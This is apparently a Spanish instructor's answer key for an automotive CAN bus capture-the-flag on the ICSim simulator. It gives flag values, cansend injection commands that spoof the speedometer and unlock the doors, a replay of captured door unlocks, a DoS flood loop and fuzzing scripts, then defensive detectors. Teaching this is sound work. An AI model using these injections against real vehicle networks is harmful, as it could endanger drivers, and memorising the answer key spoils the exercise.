# Respuestas Master — CTF Automotive UrbanFleet 2026
## ⚠️ CONFIDENCIAL — Solo para el Game Master / Docente

[Bertsioa euskaraz](04_Respuestas_master_eu.md)

> **NO distribuir a los participantes bajo ningún concepto.**  
> Imprimir este documento y guardarlo fuera del alcance de los equipos durante el CTF.

---

## Referencia rápida de flags

| Flag | Valor correcto | Tolerancia |
|---|---|---|
| FLAG-F1A | `0x244` | Sin tolerancia — exacto |
| FLAG-F1B | `0x19B` | Sin tolerancia — exacto |
| FLAG-F1C | `0x01` | Sin tolerancia — exacto |
| FLAG-F2A | Captura ICSim velocímetro >200 | Visual — validar por pantalla |
| FLAG-F2B | Captura ICSim hazard activos | Visual — validar por pantalla |
| FLAG-F2C | Captura ICSim puertas abiertas | Visual — validar por pantalla |
| FLAG-F2D | Script/bucle ejecutándose 30 s | Validar en terminal del equipo |
| FLAG-F3 | Entre 3 y 15 segundos (ICSim variable) | Cualquier valor justificado |
| FLAG-F4 | Cualquier valor >500 fps con canbusload >80% | Demostrado con captura |
| FLAG-BONUS | Demo funcionando + código | Validar en vivo |

---

## FASE 1 — Respuestas detalladas

### FLAG-F1A — ID del velocímetro: `0x244`

El ID `0x244` envía frames continuamente. El byte 3 (índice 0-based) representa la velocidad:
- `0x00` = 0 km/h
- `0xFF` = velocidad máxima (~260 km/h en ICSim)

Comando para confirmar:
```bash
cansniffer vcan0
# Mover acelerador en controls → byte 3 del ID 244 oscila
```

Log de `candump` típico:
```
(1234567890.123456) vcan0 244#0000000032000000   ← velocidad media
(1234567890.133456) vcan0 244#00000000FF000000   ← velocidad máxima
```

---

### FLAG-F1B — ID de puertas: `0x19B`

El ID `0x19B` gestiona el estado de las puertas. Byte 0:
- `0x0F` = todas las puertas cerradas/bloqueadas
- `0x00` = todas las puertas abiertas/desbloqueadas
- Bits individuales controlan puertas individuales (bit 0=delantera izq., bit 1=delantera der., etc.)

---

### FLAG-F1C — Byte giro izquierdo en 0x188: `0x01`

El ID `0x188` gestiona la señalización. Byte 0:
- `0x00` = sin señal
- `0x01` = giro izquierdo
- `0x02` = giro derecho
- `0x03` = luces de emergencia (hazard = ambos a la vez)

---

## FASE 2 — Comandos correctos

### FLAG-F2A — Velocímetro al máximo

```bash
# Opción 1: una sola vez
cansend vcan0 244#00000000FF000000

# Opción 2: en bucle (necesario para que ICSim lo muestre de forma estable)
while true; do cansend vcan0 244#00000000FF000000; sleep 0.01; done

# Opción 3: Python
python3 -c "
import can, time
bus = can.interface.Bus(channel='vcan0', bustype='socketcan')
msg = can.Message(arbitration_id=0x244, data=[0,0,0,0,0xFF,0,0,0], is_extended_id=False)
while True:
    bus.send(msg)
    time.sleep(0.01)
"
```

### FLAG-F2B — Luces de emergencia (hazard)

```bash
while true; do cansend vcan0 188#0300000000000000; sleep 0.01; done
```

### FLAG-F2C — Desbloquear todas las puertas

```bash
cansend vcan0 19B#0000000000000000
# Una sola vez es suficiente — el estado persiste hasta que controls envíe otro valor
```

### FLAG-F2D — Bucle de 30 segundos

Cualquiera de los bucles de F2A/F2B/F2C mantenido durante 30 segundos. Aceptar si:
- El terminal muestra el bucle activo
- ICSim mantiene el estado durante ese tiempo

---

## FASE 3 — Replay: comandos y valores

### Grabación

```bash
candump -l vcan0
# Genera archivo con formato: candump-YYYY-MM-DD_HHMMSS.log
# Usar controls para abrir/cerrar puertas durante la grabación
# Ctrl+C para detener
```

### Replay filtrado (solo puertas)

```bash
python3 ../CANbus_ICSim_Ciber/scripts/replay_attack.py \
    --log candump-*.log \
    --interface vcan0 \
    --id 19B

# O con canplayer nativo:
canplayer -I candump-*.log vcan0=vcan0
```

### FLAG-F3 — Tiempo mínimo de grabación

**Valor típico con ICSim: 5 segundos.**

ICSim envía el estado de las puertas cada vez que se interactúa con controls. Si el usuario abre las puertas una vez en los primeros 5 segundos, el log contendrá el evento de desbloqueo.

Aceptar cualquier valor entre **3 y 15 segundos** si el equipo puede justificarlo con su log.

---

## FASE 4 — DoS y Fuzzing

### Medición de carga base

```bash
canbusload vcan0@500000 1
# Valor típico en ICSim: 2-5%
```

### Ataque DoS

```bash
python3 ../CANbus_ICSim_Ciber/scripts/can_dos.py --interface vcan0 --id 0x000 --rate 10000
# O con cansend en bucle sin sleep:
while true; do cansend vcan0 000#0000000000000000; done
```

### Medición durante DoS

```bash
# En otra terminal mientras el DoS está activo:
canbusload vcan0@500000 1
# Valor esperado: >80%
```

### FLAG-F4 — Tasa de fps

**Rango típico:** 1.000 - 10.000 fps dependiendo del hardware de la VM.  
Aceptar cualquier valor >500 fps siempre que `canbusload` muestre >80%.

### Fuzzing dirigido

```bash
python3 ../CANbus_ICSim_Ciber/scripts/fuzz_can.py \
    --interface vcan0 \
    --mode targeted \
    --id 0x244 \
    --rate 100 \
    --duration 30
```

Comportamientos anómalos esperados: velocímetro oscilando erráticamente, ICSim congelado o mostrando valores imposibles.

---

## BONUS — Ejemplos de contramedidas aceptables

### Opción A — Detector de anomalías por frecuencia

```python
import can, time, collections

bus = can.interface.Bus(channel='vcan0', bustype='socketcan')
baseline = {0x244: 50, 0x188: 10, 0x19B: 5}  # Hz esperados
counters = collections.defaultdict(int)
window_start = time.time()

for msg in bus:
    counters[msg.arbitration_id] += 1
    elapsed = time.time() - window_start
    if elapsed >= 1.0:
        for id_, count in counters.items():
            if id_ in baseline and count > baseline[id_] * 2:
                print(f"[ALERTA] ID {hex(id_)} a {count} Hz (base: {baseline[id_]} Hz)")
        counters.clear()
        window_start = time.time()
```

### Opción B — Whitelist de IDs

```python
import can

WHITELIST = {0x244, 0x188, 0x19B}
bus = can.interface.Bus(channel='vcan0', bustype='socketcan')

for msg in bus:
    if msg.arbitration_id not in WHITELIST:
        print(f"[BLOQUEADO] ID desconocido: {hex(msg.arbitration_id)}")
```

### Opción C — Rate limiter

```python
import can, time, collections

bus = can.interface.Bus(channel='vcan0', bustype='socketcan')
MAX_RATE = {0x244: 100, 0x188: 20, 0x19B: 10}  # fps máximos
last_seen = collections.defaultdict(float)
counts = collections.defaultdict(int)
window = collections.defaultdict(float)

for msg in bus:
    aid = msg.arbitration_id
    now = time.time()
    if now - window[aid] >= 1.0:
        counts[aid] = 0
        window[aid] = now
    counts[aid] += 1
    limit = MAX_RATE.get(aid, 50)
    if counts[aid] > limit:
        print(f"[RATE LIMIT] ID {hex(aid)}: {counts[aid]} fps (límite: {limit})")
```

---

## Puntuación máxima posible

| Fase | Máximo base | Máximo con bonus |
|---|---|---|
| F1 | 150 | 200 |
| F2 | 200 | 250 |
| F3 | 150 | 200 |
| F4 | 150 | 175 |
| Bonus | 100 | 100 |
| **Total** | **750** | **925** |
